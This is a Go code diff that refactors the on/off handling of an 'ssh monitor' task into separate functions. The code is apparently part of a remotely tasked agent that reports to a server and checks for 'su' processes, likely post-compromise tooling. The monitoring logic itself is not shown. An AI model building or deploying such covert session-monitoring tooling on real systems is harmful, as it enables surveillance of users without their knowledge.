@@ -71,6 +71,26 @@ func isSUPid(pid int) bool {
 	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
+func sshMonitorOn(serverUrl string, taskData map[string]interface{}) error{
+	if sshMonitorActive {
+			return fmt.Errorf("ssh monitor already running")
+		}
+	ctx, cancel := context.WithCancel(context.Background())
+	sshMonitorCancel = cancel
+	sshMonitorActive = true
+	go runSSHMonitor(ctx, serverUrl, taskData)
+	return nil	
+}
+
+func sshMonitorOff() error {
+	if !sshMonitorActive {
+		return fmt.Errorf("ssh monitor not running")
+	}
+	sshMonitorCancel()
+	sshMonitorActive = false
+	return nil
+}
+
 func SSHMonitorHandler(serverUrl string, taskData map[string]interface{}) {
 	args := strings.TrimSpace(strings.ToLower(taskData["args"].(string)))
 
@@ -79,22 +99,19 @@ func SSHMonitorHandler(serverUrl string, taskData map[string]interface{}) {
 
 	switch args {
 	case "on":
-		if sshMonitorActive {
-			DataShipper(serverUrl, taskData, "ssh monitor already running")
+		err := sshMonitorOn(serverUrl, taskData)
+		if err != nil {
+			DataShipper(serverUrl, taskData, fmt.Sprintf("%v", err))
 			return
 		}
-		ctx, cancel := context.WithCancel(context.Background())
-		sshMonitorCancel = cancel
-		sshMonitorActive = true
-		go runSSHMonitor(ctx, serverUrl, taskData)
 		DataShipper(serverUrl, taskData, "ssh monitor started")
+
 	case "off":
-		if !sshMonitorActive {
-			DataShipper(serverUrl, taskData, "ssh monitor not running")
+		err := sshMonitorOff()
+		if err != nil {
+			DataShipper(serverUrl, taskData, fmt.Sprintf("%v", err))
 			return
 		}
-		sshMonitorCancel()
-		sshMonitorActive = false
 		DataShipper(serverUrl, taskData, "ssh monitor stopped")
 	default:
 		DataShipper(serverUrl, taskData, "usage: ssh_monitor on|off")
